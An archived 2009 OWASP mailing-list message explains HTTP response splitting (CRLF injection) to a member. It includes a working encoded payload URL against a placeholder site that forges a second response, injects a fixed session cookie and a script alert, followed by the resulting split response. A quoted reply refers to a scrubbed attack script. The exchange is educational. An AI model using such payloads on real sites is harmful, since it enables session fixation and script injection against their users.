<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-delhi] FW:  [HTTP Response Splitting]
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-delhi%40lists.owasp.org?Subject=%5BOwasp-delhi%5D%20FW%3A%20%20%5BHTTP%20Response%20Splitting%5D&In-Reply-To=">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="000519.html">
   <LINK REL="Next"  HREF="000524.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-delhi] FW:  [HTTP Response Splitting]</H1>
    <B>Nilesh Kumar (India)</B> 
    <A HREF="mailto:owasp-delhi%40lists.owasp.org?Subject=%5BOwasp-delhi%5D%20FW%3A%20%20%5BHTTP%20Response%20Splitting%5D&In-Reply-To="
       TITLE="[Owasp-delhi] FW:  [HTTP Response Splitting]">Nilesh.Kumar at sdgc.com
       </A><BR>
    <I>Tue Jun 23 04:47:48 EDT 2009</I>
    <P><UL>
        <LI>Previous message: <A HREF="000519.html">[Owasp-delhi] [Buffer Overflow detection]
</A></li>
        <LI>Next message: <A HREF="000524.html">[Owasp-delhi] Query for WebScarab
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#523">[ date ]</a>
              <a href="thread.html#523">[ thread ]</a>
              <a href="subject.html#523">[ subject ]</a>
              <a href="author.html#523">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Hi Suresh,

 

    An application is vulnerable to HTTP Response splitting a.k.a. CRLF
injection when it doesn't validate the user input properly. 

 

For example, if requesting something like GET /myPage.asp?value=anyValue
HTTP/1.1 returns response that includes a location header and 302
response code:

HTTP/1.1 302 Found

....

....

Location: <A HREF="http://www.myApplication.com/myPage.asp?value=anyValue">http://www.myApplication.com/myPage.asp?value=anyValue</A>

Then it might be vulnerable. It means the application is returning the
same URL which is requested by the user in Location header.

How to exploit:

Suppose a link crafted by an attacker is clicked by a valid user. I am
crafting the script just provided by Nimisha:

 

<A HREF="http://www.myApplication.com/myPage.asp?value=anyValue%0d%0afoobar%0d%0a">http://www.myApplication.com/myPage.asp?value=anyValue%0d%0afoobar%0d%0a</A>
Content-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20
text/html%0d%0aContent-Length:%2046%0d%0a%0d%0aSet-Cookie:%20JSESSIONID=
9B10905435F29B9CB5B0293FAD933B06%0d%0a%0d%0a&lt;html&gt;&lt;script&gt;alert(&quot;hacked&quot;
)&lt;/script&gt;&lt;/html
&lt;<A HREF="http://www.myApplication.com/myPage.asp?value=12345foobar%0d%0aContent-">http://www.myApplication.com/myPage.asp?value=12345foobar%0d%0aContent-</A>
Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/htm
l%0d%0aContent-Length:%2046%0d%0a%0d%0aSet-Cookie:%20JSESSIONID=9B109054
35F29B9CB5B0293FAD933B06%0d%0a%0d%0a%3chtml%3e%3cscript%3ealert(%22hacke
d%22)%3c/script%3e%3c/html&gt; &gt;

 

It will give you response like:

HTTP/1.1 302 Found

....

....

Location: <A HREF="http://www.myApplication.com/myPage.asp?value=12345">http://www.myApplication.com/myPage.asp?value=12345</A>
&lt;<A HREF="http://www.myApplication.com/myPage.asp?value=12345">http://www.myApplication.com/myPage.asp?value=12345</A>&gt; 

 

foobar
//second response ; %0d is equivalent to Carriage return; %0a is
equivalent to Line feed

Content-Length: 0

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 46

Set-Cookie: JSESSIONID=9B10905435F29B9CB5B0293FAD933B06

&lt;html&gt;&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;&lt;/html&gt;

 

You get two responses one by server and another by attacker. So this was
an example of Response splitting.

I think you might have got a bit idea.

 

Thanks,

Nilesh Kumar CEH ISMS LA

Security Specialist

Governance,Risk &amp;  Compliance (GRC)
________________________________________________________________________


Cell:+91-9891524880 


SDG Software India Pvt. Ltd. 
A-10, Sector 2,NOIDA 201301, (UP), INDIA 
Website: www.sdgc.com 

Please Note: The e-mail content is intended for the sole use of the
intended recipient/s and may contain material that is CONFIDENTIAL AND
PRIVATE COMPANY INFORMATION. Any review or reliance by others or copying
or distribution or forwarding of any or all of the contents in this
message is STRICTLY PROHIBITED. If you have erroneously received this
message, please delete it immediately and notify the sender. Before
opening any attachments please check them for viruses and defects.

 

From: <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-delhi">owasp-delhi-bounces at lists.owasp.org</A>
[mailto:<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-delhi">owasp-delhi-bounces at lists.owasp.org</A>] On Behalf Of Gohil, Nimisha
Sent: Tuesday, June 23, 2009 12:46 PM
To: Pradyumna Sharma; suresh tiwary
Cc: <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-delhi">owasp-delhi at lists.owasp.org</A>
Subject: Re: [Owasp-delhi] [HTTP Response Splitting]

 

Hi Suresh,

 

I think any proxy will do response splitting. You need to select right
parameter that will allow you to insert the attached script. Please find
attached script that will help you to do Response splitting. You need to
modify as per your requirement.

 

Thanks &amp; Regards,

Nimisha Gohil

Senior System Analyst-Penetration Testing 

Remote Infrastructure Management (RIM)

Fiserv

Mobile: 971-100-8054

Office: +1-877-271-3943; Extn.: 5854

www.fiserv.com
&lt;<A HREF="https://webmail.fiserv.co.in/exchweb/bin/redir.asp?URL=https://webmail.">https://webmail.fiserv.co.in/exchweb/bin/redir.asp?URL=https://webmail.</A>
fiserv.co.in/exchweb/bin/redir.asp?URL=<A HREF="https://webmail.fiserv.co.in/exch">https://webmail.fiserv.co.in/exch</A>
web/bin/redir.asp?URL=<A HREF="https://webmail.fiserv.co.in/exchweb/bin/redir.asp">https://webmail.fiserv.co.in/exchweb/bin/redir.asp</A>
?URL=<A HREF="https://webmail.fiserv.co.in/exchweb/bin/redir.asp?URL=https://webm">https://webmail.fiserv.co.in/exchweb/bin/redir.asp?URL=https://webm</A>
ail.fiserv.co.in/exchweb/bin/redir.asp?URL=<A HREF="https://webmail.fiserv.co.in/">https://webmail.fiserv.co.in/</A>
exchweb/bin/redir.asp?URL=<A HREF="http://www.fiserv.com">http://www.fiserv.com</A>&gt; 

&quot;Working Together is -The Success&quot;

 

 

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <A HREF="https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090623/cb50ff49/attachment-0001.html">https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090623/cb50ff49/attachment-0001.html</A> 
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: Response._Splitting.txt
Url: <A HREF="https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090623/cb50ff49/attachment-0002.txt">https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090623/cb50ff49/attachment-0002.txt</A> 
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: ATT06274.txt
Url: <A HREF="https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090623/cb50ff49/attachment-0003.txt">https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090623/cb50ff49/attachment-0003.txt</A> 
</PRE>





<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="000519.html">[Owasp-delhi] [Buffer Overflow detection]
</A></li>
	<LI>Next message: <A HREF="000524.html">[Owasp-delhi] Query for WebScarab
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#523">[ date ]</a>
              <a href="thread.html#523">[ thread ]</a>
              <a href="subject.html#523">[ subject ]</a>
              <a href="author.html#523">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-delhi">More information about the Owasp-delhi
mailing list</a><br>
</body></html>
